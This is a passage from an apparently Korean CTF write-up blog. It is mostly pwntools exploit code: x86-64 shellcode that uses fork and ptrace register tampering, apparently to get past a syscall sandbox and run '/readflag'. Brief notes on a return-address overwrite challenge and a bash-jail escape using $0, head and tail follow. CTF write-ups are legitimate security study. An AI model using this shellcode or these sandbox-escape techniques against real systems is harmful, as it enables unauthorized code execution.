style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;ptrace(PTRACE_SYSCALL,&nbsp;childpid,&nbsp;NULL,&nbsp;NULL)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,0x18</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,[rsp]</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r10,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,0x54</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c"></span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;waitpid(childpid,&nbsp;NULL,&nbsp;0)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,[rsp]</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r10,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,0x3d</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;ptrace(PTRACE_GETREGS,&nbsp;childpid,&nbsp;NULL,&nbsp;&amp;regs&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,0xc</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,&nbsp;[rsp]</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r10,rsp</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;r10,0x400</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rcx,r10</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,0x65</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;ptrace(PTRACE_SETREGS,&nbsp;childpid,&nbsp;NULL,&nbsp;&amp;regs)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,&nbsp;0xd</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,&nbsp;[rsp]</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,&nbsp;0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r10,&nbsp;rsp</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;r10,&nbsp;0x400</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r9,&nbsp;r10</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;r9,&nbsp;0x78</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;qword&nbsp;ptr&nbsp;[r9],&nbsp;0x0000000000000002</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,&nbsp;0x65</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;ptrace(PTRACE_DETACH,&nbsp;childpid,&nbsp;NULL,&nbsp;NULL)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,&nbsp;0x11</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,&nbsp;[rsp]</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,&nbsp;0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r10,&nbsp;0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,&nbsp;101</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c"></span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,&nbsp;0x3c</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;child:</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;ptrace(PTRACE_TRACEME,&nbsp;0,&nbsp;NULL,&nbsp;NULL)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdx,&nbsp;0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;r10,&nbsp;0</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,&nbsp;101</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c"></span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;syscall(SYS_gettid)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,&nbsp;0x27/*0xba*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c"></span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;syscall(SYS_tkill,&nbsp;pid,&nbsp;SIGSTOP)&nbsp;*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,&nbsp;rax</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,&nbsp;0x13</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,&nbsp;0x3e/*0xc8*/</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c"></span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">'</span><span style="color:#63a35c">''</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>&nbsp;shellcraft.pushstr(<span style="color:#63a35c">'/readflag'</span>)&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>&nbsp;<span style="color:#63a35c">''</span><span style="color:#63a35c">'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rdi,rsp</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;edx,edx</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;esi,esi</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;rax,rax</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rdi</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;rdi</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rsi,rdi</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,39</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">''</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">r.sendline(asm(shellcode))</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.interactive()</div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>

## auto injection

바이러니 안에 변수와 ret의 거리를 나타낸 데이터가 있다 그걸 이용하여 ret을 적절하게 덮는다

bash jail: $0, head,tail

![bash_jail](https://github.com/aht7525/aht7525.github.io/blob/master/_posts/bash_jail.PNG?raw=true)



deadfile이랑 meet은 롸업보고 공부해야겠다.